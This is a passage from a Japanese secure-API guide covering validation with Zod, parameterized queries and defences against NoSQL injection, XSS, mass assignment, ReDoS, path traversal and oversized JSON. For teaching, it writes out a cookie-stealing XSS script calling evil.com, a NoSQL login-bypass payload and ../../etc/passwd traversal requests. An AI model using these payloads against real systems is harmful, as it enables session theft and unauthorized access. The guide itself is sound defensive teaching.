    .orderBy('created_at', 'desc');
}
```

### 7.3 動的クエリの安全な構築

検索機能など、条件が動的に変化するクエリでは、クエリビルダーパターンを使って安全に構築する。

```typescript
// 動的検索クエリの安全な構築
interface UserSearchParams {
  name?: string;
  email?: string;
  role?: string;
  minAge?: number;
  maxAge?: number;
  sortBy?: string;
  order?: 'asc' | 'desc';
  page?: number;
  perPage?: number;
}

// Zod でパラメータを事前検証
const UserSearchParamsSchema = z.object({
  name: z.string().max(100).optional(),
  email: z.string().email().optional(),
  role: z.enum(['user', 'admin', 'editor']).optional(),
  minAge: z.coerce.number().int().min(0).max(150).optional(),
  maxAge: z.coerce.number().int().min(0).max(150).optional(),
  sortBy: z.enum(['name', 'email', 'created_at']).default('created_at'),
  order: z.enum(['asc', 'desc']).default('desc'),
  page: z.coerce.number().int().min(1).default(1),
  perPage: z.coerce.number().int().min(1).max(100).default(20),
}).refine(
  (data) => {
    if (data.minAge !== undefined && data.maxAge !== undefined) {
      return data.minAge <= data.maxAge;
    }
    return true;
  },
  { message: 'minAge must be <= maxAge' }
);

// 安全な動的クエリビルダ
async function searchUsers(params: UserSearchParams) {
  const conditions: string[] = [];
  const values: any[] = [];
  let paramIndex = 1;

  if (params.name) {
    conditions.push(`name ILIKE $${paramIndex++}`);
    values.push(`%${params.name}%`);
  }

  if (params.email) {
    conditions.push(`email = $${paramIndex++}`);
    values.push(params.email);
  }

  if (params.role) {
    conditions.push(`role = $${paramIndex++}`);
    values.push(params.role);
  }

  if (params.minAge !== undefined) {
    conditions.push(`age >= $${paramIndex++}`);
    values.push(params.minAge);
  }

  if (params.maxAge !== undefined) {
    conditions.push(`age <= $${paramIndex++}`);
    values.push(params.maxAge);
  }

  const whereClause = conditions.length > 0
    ? `WHERE ${conditions.join(' AND ')}`
    : '';

  // sortBy は enum で検証済みのためホワイトリストに含まれる値のみ
  // -> 直接SQL文に埋め込んでも安全
  const allowedSortColumns = ['name', 'email', 'created_at'];
  const sortColumn = allowedSortColumns.includes(params.sortBy || '')
    ? params.sortBy
    : 'created_at';
  const sortOrder = params.order === 'asc' ? 'ASC' : 'DESC';

  const offset = ((params.page || 1) - 1) * (params.perPage || 20);

  const query = `
    SELECT id, name, email, role, age, created_at
    FROM users
    ${whereClause}
    ORDER BY ${sortColumn} ${sortOrder}
    LIMIT $${paramIndex++} OFFSET $${paramIndex++}
  `;

  values.push(params.perPage || 20, offset);

  return pool.query(query, values);
}
```

### 7.4 NoSQL インジェクション

MongoDB などの NoSQL データベースでも、インジェクション攻撃は発生し得る。

```typescript
// MongoDB NoSQL インジェクションの例

// NG: ユーザー入力を直接クエリに使用
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  // email が { "$gt": "" } のようなオブジェクトの場合、
  // 全レコードにマッチしてしまう
  const user = await db.collection('users').findOne({
    email,
    password,
  });
});

// 攻撃ペイロード:
// { "email": { "$gt": "" }, "password": { "$gt": "" } }
// -> 全レコードにマッチ（認証バイパス）

// OK: 型チェックで防御
app.post('/api/login', async (req, res) => {
  const schema = z.object({
    email: z.string().email(),   // string 型を強制
    password: z.string().min(1), // string 型を強制
  });

  const result = schema.safeParse(req.body);
  if (!result.success) {
    return res.status(422).json({ errors: result.error.issues });
  }

  // バリデーション済みのため、必ず string 型が保証される
  const user = await db.collection('users').findOne({
    email: result.data.email,
    // パスワードは平文比較ではなく bcrypt.compare を使用すべき
  });
});
```

---

## 8. 一般的な攻撃への防御

### 8.1 XSS（クロスサイトスクリプティング）

```typescript
// XSS 攻撃の種類と防御

// 1. Reflected XSS: URL パラメータの値がそのままHTMLに埋め込まれる
//    攻撃: GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// 2. Stored XSS: 保存されたデータがそのままHTMLに描画される
//    攻撃: プロフィールの名前に <script>alert('XSS')</script> を登録

// 3. DOM-based XSS: クライアントサイドJSが安全でないデータ操作を行う
//    攻撃: innerHTML に未エスケープのユーザー入力を代入

// --- 防御策 ---

// ① API レスポンスヘッダーの設定
app.use((req, res, next) => {
  // Content-Type を明示（ブラウザの MIME スニッフィングを防止）
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // CSP（Content Security Policy）
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );

  // X-XSS-Protection（レガシーブラウザ向け）
  res.setHeader('X-XSS-Protection', '1; mode=block');

  next();
});

// ② JSON API では Content-Type: application/json を返す
//    ブラウザは JSON を HTML として解釈しないため XSS リスクが低減
app.get('/api/users', (req, res) => {
  res.json({ data: users }); // Content-Type: application/json が自動設定
});

// ③ 入力のバリデーションとサニタイゼーション
const UserProfileSchema = z.object({
  displayName: z.string()
    .min(1)
    .max(50)
    .regex(/^[a-zA-Z0-9\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FFF\s_-]+$/,
      'Display name contains invalid characters'
    ),
  bio: z.string()
    .max(500)
    .transform(escapeHtml),
});
```

### 8.2 Mass Assignment（一括代入攻撃）

```typescript
// Mass Assignment 攻撃の例と防御

// 攻撃シナリオ:
// PUT /api/users/me
// { "name": "Taro", "email": "taro@example.com", "role": "admin", "isVerified": true }
// -> role と isVerified は本来ユーザーが変更できないフィールド

// --- 防御策1: Zod の strict() + pick() ---

// 全フィールドを含む基本スキーマ
const UserBaseSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  role: z.enum(['user', 'admin', 'editor']),
  isVerified: z.boolean(),
  bio: z.string().max(500).optional(),
  avatar: z.string().url().optional(),
});

// ユーザー自身が更新可能なフィールドのみ抽出
const UserSelfUpdateSchema = UserBaseSchema
  .pick({
    name: true,
    bio: true,
    avatar: true,
  })
  .strict(); // 未定義フィールドがあればエラー

// 管理者が更新可能なフィールド
const UserAdminUpdateSchema = UserBaseSchema
  .partial()  // 全フィールドを optional に
  .strict();

// --- 防御策2: class-validator の whitelist ---
// NestJS の ValidationPipe で自動的に未定義フィールドを除去
// new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true })

// --- 防御策3: 明示的なフィールド選択 ---
function pickAllowedFields<T extends Record<string, any>>(
  data: T,
  allowedFields: (keyof T)[]
): Partial<T> {
  const result: Partial<T> = {};
  for (const field of allowedFields) {
    if (field in data) {
      result[field] = data[field];
    }
  }
  return result;
}

// 使用例
app.put('/api/users/me', async (req, res) => {
  const safeData = pickAllowedFields(req.body, ['name', 'bio', 'avatar']);
  await userService.update(req.user.id, safeData);
});
```

### 8.3 ReDoS（正規表現 DoS）

```typescript
// ReDoS 攻撃: 悪意のある入力で正規表現のバックトラッキングが爆発する

// NG: 脆弱な正規表現
const emailRegexBad = /^([a-zA-Z0-9]+\.)*[a-zA-Z0-9]+@([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/;
// "aaaaaaaaaaaaaaaaaaaaaaaaa!" のような入力で指数的にバックトラックする

// OK: 安全な正規表現の書き方
// 1. 入力長を先に制限する
const safeEmailCheck = (input: string): boolean => {
  if (input.length > 254) return false; // RFC 5321
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
};

// 2. 組み込みのバリデータを使用する（Zod, Joi の email()）
//    これらは ReDoS 耐性のある実装を使用している

// 3. 正規表現の複雑度を制限する
//    - ネストした量指定子を避ける: (a+)+ -> a+
//    - 重複する文字クラスを避ける: [a-zA-Z0-9]*[a-z]* -> [a-zA-Z0-9]*
//    - 固定長のアンカーを使用する: ^...$

// 4. タイムアウトを設定する（Node.js の場合）
function safeRegexTest(
  pattern: RegExp,
  input: string,
  timeoutMs: number = 100
): boolean {
  // 入力長の制限を先に適用
  if (input.length > 10000) return false;

  const start = performance.now();
  try {
    return pattern.test(input);
  } finally {
    const elapsed = performance.now() - start;
    if (elapsed > timeoutMs) {
      console.warn(`Regex took ${elapsed}ms for input length ${input.length}`);
    }
  }
}
```

### 8.4 パストラバーサル

```typescript
// パストラバーサル攻撃: ファイルパスを操作してアクセス制御を回避する

// 攻撃例:
// GET /api/files/../../etc/passwd
// GET /api/files/..%2F..%2Fetc%2Fpasswd  (URL エンコード)

import path from 'path';

// NG: パス検証なし
app.get('/api/files/:filename', (req, res) => {
  const filePath = path.join('/uploads', req.params.filename);
  res.sendFile(filePath); // ../../etc/passwd にアクセス可能
});

// OK: 安全なファイルアクセス
const UPLOAD_DIR = '/app/uploads';

const FilenameSchema = z.string()
  .min(1)
  .max(255)
  .regex(/^[a-zA-Z0-9][a-zA-Z0-9._-]*$/, 'Invalid filename')
  .refine(
    (name) => !name.includes('..'),
    'Path traversal detected'
  )
  .refine(
    (name) => !name.includes('\0'),
    'Null byte detected'
  );

app.get('/api/files/:filename', (req, res) => {
  const result = FilenameSchema.safeParse(req.params.filename);
  if (!result.success) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  const filePath = path.resolve(UPLOAD_DIR, result.data);

  // ベースディレクトリ内に収まっているか確認
  if (!filePath.startsWith(UPLOAD_DIR)) {
    return res.status(403).json({ error: 'Access denied' });
  }

  res.sendFile(filePath);
});
```

### 8.5 JSON ペイロード攻撃

```typescript
// JSON ペイロード攻撃: 巨大 or 深くネストした JSON で DoS を引き起こす

// 攻撃例:
// 1. 巨大ペイロード: 数百 MB の JSON
// 2. 深いネスト: { "a": { "b": { "c": { ... 10000段 ... } } } }
// 3. 大量のキー: { "key1": 1, "key2": 2, ..., "key1000000": 1000000 }

// --- 防御策 ---

// ① ボディサイズ制限
import express from 'express';
app.use(express.json({
  limit: '1mb',  // 1MB を超えるリクエストを拒否
}));

// ② ネスト深度の制限（カスタムミドルウェア）
function checkNestingDepth(obj: any, maxDepth: number, currentDepth: number = 0): boolean {
  if (currentDepth > maxDepth) return false;
  if (typeof obj !== 'object' || obj === null) return true;

  for (const value of Object.values(obj)) {
    if (!checkNestingDepth(value, maxDepth, currentDepth + 1)) {
      return false;
    }
  }
  return true;
}

app.use((req, res, next) => {
  if (req.body && !checkNestingDepth(req.body, 10)) {
    return res.status(400).json({
      error: 'Request body nesting depth exceeds maximum allowed (10)',
    });
  }
  next();
});

// ③ オブジェクトキー数の制限
function checkKeyCount(obj: any, maxKeys: number): boolean {
  if (typeof obj !== 'object' || obj === null) return true;
  if (Object.keys(obj).length > maxKeys) return false;

  for (const value of Object.values(obj)) {
    if (!checkKeyCount(value, maxKeys)) return false;
  }
  return true;
}

// ④ 配列サイズの制限（Zod で宣言的に）
const OrderSchema = z.object({
  items: z.array(
    z.object({
      productId: z.string().uuid(),
      quantity: z.number().int().min(1).max(999),
    })
  ).min(1).max(100), // 最大100アイテム
  memo: z.string().max(500).optional(),
});
```

---

## 9. バリデーションエラーレスポンス設計

### 9.1 RFC 7807 準拠のエラーレスポンス

API のエラーレスポンスは一貫した形式で返すべきである。RFC 7807（Problem Details for HTTP APIs）は、HTTP API のエラーレスポンスの標準形式を定義している。

```typescript
// RFC 7807 準拠のエラーレスポンス型定義
interface ProblemDetails {
  type: string;      // エラー種別のURI（ドキュメントURL）
  title: string;     // 人間可読なエラー概要
  status: number;    // HTTP ステータスコード
  detail?: string;   // この特定のエラーの詳細説明
  instance?: string; // このエラーが発生した具体的なURI
}

interface ValidationProblemDetails extends ProblemDetails {
  errors: Array<{
    field: string;      // エラーが発生したフィールド名
    code: string;       // 機械可読なエラーコード
    message: string;    // 人間可読なエラーメッセージ
    rejected?: unknown; // 拒否された値（デバッグ用、本番では省略可）
  }>;
}

// バリデーションエラーレスポンスの例
// HTTP/1.1 422 Unprocessable Entity
// Content-Type: application/problem+json
//
// {
//   "type": "https://api.example.com/errors/validation",
//   "title": "Validation Error",
//   "status": 422,
//   "detail": "The request body contains 3 validation error(s).",
//   "instance": "/api/v1/users",
//   "errors": [
//     {
//       "field": "email",
//       "code": "invalid_string",
//       "message": "Invalid email format"
//     },
//     {
//       "field": "age",
//       "code": "too_small",
//       "message": "Age must be non-negative"
//     },
//     {
//       "field": "address.postalCode",
//       "code": "invalid_string",
//       "message": "Invalid postal code"
//     }
//   ],
//   "requestId": "req_abc123"
// }

// 統一エラーハンドラ
function createValidationErrorResponse(
  errors: Array<{ field: string; code: string; message: string }>,
  requestPath: string,
  requestId: string
): ValidationProblemDetails & { requestId: string } {
  return {
    type: 'https://api.example.com/errors/validation',
    title: 'Validation Error',
    status: 422,
    detail: `The request contains ${errors.length} validation error(s).`,
    instance: requestPath,
    errors,
    requestId,
  };
}
```

### 9.2 ステータスコードの使い分け

| ステータスコード | 用途 | 使用場面 |
|----------------|------|---------|
| 400 Bad Request | リクエスト構文エラー | JSON パースエラー、Content-Type 不正 |
| 401 Unauthorized | 認証エラー | トークン未送信、トークン期限切れ |
| 403 Forbidden | 認可エラー | 権限不足 |
| 404 Not Found | リソース不在 | 指定IDのリソースが存在しない |
| 409 Conflict | 競合 | メールアドレスの重複 |
| 413 Payload Too Large | ペイロード過大 | ボディサイズ超過 |
| 422 Unprocessable Entity | バリデーションエラー | フィールド値の不正 |
| 429 Too Many Requests | レート制限 | API 呼び出し回数超過 |

### 9.3 エラーメッセージの国際化（i18n）

```typescript
// バリデーションエラーメッセージの国際化対応

// エラーコードとメッセージの分離
const ERROR_MESSAGES: Record<string, Record<string, string>> = {
  ja: {
    'validation.required': '{field}は必須です',
    'validation.email': '有効なメールアドレスを入力してください',
    'validation.min_length': '{field}は{min}文字以上で入力してください',
    'validation.max_length': '{field}は{max}文字以内で入力してください',
    'validation.min': '{field}は{min}以上の値を入力してください',
    'validation.max': '{field}は{max}以下の値を入力してください',
    'validation.pattern': '{field}の形式が正しくありません',
    'validation.enum': '{field}は{values}のいずれかを指定してください',
  },
  en: {
    'validation.required': '{field} is required',
    'validation.email': 'Please enter a valid email address',
    'validation.min_length': '{field} must be at least {min} characters',
    'validation.max_length': '{field} must be at most {max} characters',
    'validation.min': '{field} must be at least {min}',
    'validation.max': '{field} must be at most {max}',
    'validation.pattern': '{field} format is invalid',
    'validation.enum': '{field} must be one of {values}',
  },
};

function getErrorMessage(
  locale: string,
  code: string,
  params: Record<string, string | number> = {}
): string {
  const messages = ERROR_MESSAGES[locale] || ERROR_MESSAGES['en'];
  let message = messages[code] || code;

  for (const [key, value] of Object.entries(params)) {
    message = message.replace(`{${key}}`, String(value));
  }

  return message;
}

// Accept-Language ヘッダーに基づくロケール決定
function getLocaleFromRequest(req: Request): string {
  const acceptLanguage = req.headers['accept-language'] || 'en';
  const preferred = acceptLanguage.split(',')[0].split('-')[0].toLowerCase();
  return ['ja', 'en'].includes(preferred) ? preferred : 'en';
}
```

